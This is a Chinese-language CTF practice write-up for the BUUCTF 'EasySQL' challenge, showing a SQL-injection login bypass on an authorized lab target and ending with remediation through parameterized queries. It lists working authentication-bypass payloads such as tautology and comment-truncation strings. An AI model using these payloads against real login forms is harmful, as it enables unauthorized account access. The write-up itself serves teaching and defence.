# CTF 练习：[极客大挑战 2019]EasySQL（万能密码）

> 平台：CTF² / BUUCTF 练习（Web · 简单 · 1 分，7690 人解出）
> 环境：Kali Linux + 浏览器 + curl
> 日期：2026-11-18
> 性质：平台提供的授权靶场

---

## 一、目标

登录框存在 SQL 注入，用「万能密码」绕过登录，拿到 flag。

## 二、过程

### 2.1 观察

打开靶机地址，是一个登录页面：

```
用户名 [        ]
密码   [        ]
[ 登录 ]
```

提交后请求形如：

```
GET /check.php?username=xxx&password=xxx
```

### 2.2 魔数测试

用户名和密码都输入：

```
1' or '1'='1
```

提交后页面显示 **Login Success!**，并直接给出 flag。

### 2.3 为什么能成

后端 SQL 大致是：

```sql
SELECT * FROM users WHERE username = '输入1' AND password = '输入2'
```

代入后变成：

```sql
SELECT * FROM users
WHERE username = '1' or '1'='1' AND password = '1' or '1'='1'
```

由于 `AND` 优先级高于 `OR`，整体等价于：

```sql
(username = '1') OR ('1'='1' AND password = '1') OR ('1'='1')
```

**最后一段 `'1'='1'` 恒真** → 整条 WHERE 恒真 → 返回第一条用户 → 登录成功。

### 2.4 备选 payload

| payload | 说明 |
|---|---|
| `1' or '1'='1` | 两字段都填，恒真 |
| `admin' #` | `#` 注释掉后面的密码判断 |
| `admin' or '1'='1' #` | 注释闭合 |
| `' or 1=1 -- ` | `-- ` 注释（注意尾部空格） |

## 二·五、复盘四问

### 推理链（为什么这么做）

**第 1 步：为什么先随便登录一次**

- 我在想：要看清请求怎么带参（GET 还是 POST、字段名是什么）。
- 验证：请求形如 `GET /check.php?username=xxx&password=xxx`。
- 所以：参数直接进 URL，可以用浏览器改。

**第 2 步：为什么两个框都填 payload**

- 我在想：SQL 里两个条件用 `AND` 连接，只注入一个字段，另一个仍会卡住。
- 验证：两个都填 `1' or '1'='1` 后登录成功。
- 所以：**要保证整条 WHERE 恒真**，不能只破一个字段。

**第 3 步：为什么 `OR` 能压过 `AND`**

- 我在想：SQL 运算符优先级 `AND` > `OR`。
- 验证：代入后变成 `(username='1') OR ('1'='1' AND password='1') OR ('1'='1')`，最后一段恒真。
- 所以：整条条件恒真，返回第一条用户。

**第 4 步：为什么还准备 `admin' #`**

- 我在想：如果 `OR` 恒真被过滤，就用注释直接截断密码判断。
- 验证：`admin' #` 也能登录。
- 所以：至少两条独立思路，互为后备。

### 载荷是怎么来的

- **`1' or '1'='1`**：先闭合引号，再给恒真条件。
- **`admin' #`**：闭合后直接注释掉 `AND password=...`。
- **为什么要闭合**：不闭合引号，语法直接报错。

### 逐段解释

| 片段 | 作用 |
|---|---|
| `1'` | 闭合 username 的引号 |
| `or '1'='1` | 追加恒真条件 |
| `#` | 注释掉剩余 SQL（含密码判断） |
| `-- ` | 另一种注释，注意尾部空格 |

### 失败尝试与坑

| 现象 | 原因 | 解决 |
|---|---|---|
| 只填一个框不成功 | 另一个条件仍为假 | 两个框都填 |
| `--` 注释无效 | MySQL 要求 `--` 后有空格 | 用 `-- ` 或改用 `#` |

### 自测

**Q1**：为什么两个字段都要注入？
**A**：`AND` 连接两个条件，任一为假整条就假。

**Q2**：`#` 在 MySQL 里做什么？
**A**：注释掉本行后面所有内容，包括密码判断。

**Q3**：根因一句话？
**A**：用户输入被拼接进 SQL，数据被当成代码。

## 三、原理

1. **字符串拼接**：用户输入直接拼进 SQL，没有参数化。
2. **恒真条件**：`'1'='1'` 让 WHERE 对整个表成立。
3. **注释截断**：`#` / `-- ` 把后面的条件注释掉，绕过密码校验。

## 四、修复

| 措施 | 说明 |
|---|---|
| **参数化查询** | PDO `prepare` + `bindParam`，数据不当代码 |
| 输入校验 | 用户名限制字符集、长度 |
| 错误信息 | 关闭详细 SQL 报错 |
| 最小权限 | 数据库账号只用得到必要表 |

```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :u AND password = :p');
$stmt->execute([':u' => $username, ':p' => $password]);
```

## 五、踩坑

- 两个输入框**都要填** payload，只填一个不够。
- 单引号会被 URL 编码（`%27`），浏览器自动处理，不用手动改。
- 如果页面提示格式限制，改用 `admin' #` 这种注释型。

## 六、收获

- 一道题把「恒真条件」和「注释截断」两种注入思路都复习了。
- 再次确认：**SQL 注入的根因永远是『数据被当成代码』**。
